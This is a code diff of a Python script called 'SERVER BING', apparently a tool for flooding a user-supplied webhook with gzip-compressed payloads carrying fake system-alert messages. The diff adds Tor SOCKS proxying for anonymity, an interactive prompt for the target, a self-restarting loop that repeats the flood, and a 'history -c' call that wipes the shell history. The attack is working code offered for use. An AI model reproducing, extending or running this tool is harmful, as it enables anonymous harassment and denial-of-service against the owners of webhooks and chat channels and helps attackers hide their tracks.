@@ -1,4 +1,10 @@
-import requests, json, gzip, io, os, sys, time
+import requests
+import json
+import gzip
+import io
+import os
+import sys
+import time
 
 R = '\033[1;31m' 
 G = '\033[1;32m' 
@@ -6,6 +12,12 @@ Y = '\033[1;33m'
 B = '\033[1;34m' 
 C = '\033[1;36m' 
 W = '\033[0m'    
+
+s = requests.Session()
+s.proxies = {
+    'http': 'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
 
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -19,9 +31,9 @@ def show_interface():
   ___) | |___|  _ < \ V / | |___|  _ <  | |_) | || |\  | |_| |
  |____/|_____|_| \_\ \_/  |_____|_| \_\ |____/___|_| \_|\____|
 {W}
-{C}  [#] Name: {W}SERVER BING (Zero-Payload)
-{C}  [#] Author: {W}Dhiya Admin
-{C}  [#] Effect: {R}Instant Pizza & Coke Explosion (Lag Protocol){W}
+{C}  [#] Name: {W}SERVER BING (Tor-Edition)
+{C}  [#] Status: {G}Connected via Tor Node{W}
+{C}  [#] Safety: {Y}High Anonymity Enabled{W}
     """)
     print(f"{G}[01]{W} Launch Stealth Mission (1 Hour Timer)")
     print(f"{G}[02]{W} Instant Packet Explosion (Direct)")
@@ -35,17 +47,16 @@ def launch_mission():
     if choice == "00": 
         sys.exit()
         
-    target_url = "YOUR_WEBHOOK_URL_HERE"
+    u = input(f"{C}ENTER WEBHOOK URL: {W}").strip()
     
-    if target_url == "YOUR_WEBHOOK_URL_HERE":
-        print(f"\n{R}[X] Set Webhook URL in the script first!{W}")
+    if not u.startswith("http"):
         return
 
     eng_stages = [
-        "[SYSTEM_CRITICAL] error_code_404: packet_leak_detected. initializing_repair_protocol_10min...",
-        "[SECURITY_ALERT] unauthorized_bot_activity_detected. tracing_origin... check_external_nodes.",
-        "[MAINTENANCE_NOTICE] emergency_shutdown_imminent. flushing_buffer_logs... connection_unstable.",
-        "[SUCCESS] threat_neutralized. malicious_entities_purged. system_restored_to_normal."
+        "[SYSTEM_CRITICAL] error_code_404: packet_leak_detected.",
+        "[SECURITY_ALERT] unauthorized_bot_activity_detected.",
+        "[MAINTENANCE_NOTICE] emergency_shutdown_imminent.",
+        "[SUCCESS] threat_neutralized. malicious_entities_purged."
     ]
 
     all_pkgs = []
@@ -59,16 +70,17 @@ def launch_mission():
     if choice == "01":
         time.sleep(3600)
 
-    headers = {'Content-Encoding': 'gzip', 'Content-Type': 'application/json'}
+    h = {'Content-Encoding': 'gzip', 'Content-Type': 'application/json'}
+    
     for pkg in all_pkgs:
         try:
-            requests.post(target_url, data=pkg, headers=headers, timeout=5)
+            s.post(u, data=pkg, headers=h, timeout=15)
         except: 
             pass
     
     os.system("history -c")
-    print(f"\n{G}[#] MISSION COMPLETE.{W}")
-    sys.exit()
+    input()
+    launch_mission()
 
 if __name__ == "__main__":
     launch_mission()
